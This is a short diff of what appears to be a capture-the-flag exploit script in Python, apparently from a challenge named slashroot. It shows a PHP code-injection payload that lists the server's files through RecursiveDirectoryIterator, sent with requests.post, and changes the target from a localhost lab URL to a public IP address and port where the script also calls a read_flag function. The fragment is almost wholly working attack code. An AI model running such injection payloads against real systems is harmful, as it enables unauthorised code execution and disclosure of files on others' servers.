@@ -54,5 +54,5 @@ def get_dir_list(url):
     payload_get = "?_=$a=new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));$a->rewind();print_r(iterator_to_array($a));"    
     return requests.post(url+payload_get,data={"e":payload_post}).text
 
-print(get_dir_list("http://localhost:6074/slashroot/soal_fix/index.php"))
-print(read_flag("http://localhost:6074/slashroot/soal_fix/index.php"))
+print(get_dir_list("http://103.145.226.170:3034/index.php"))
+print(read_flag("http://103.145.226.170:3034/"))
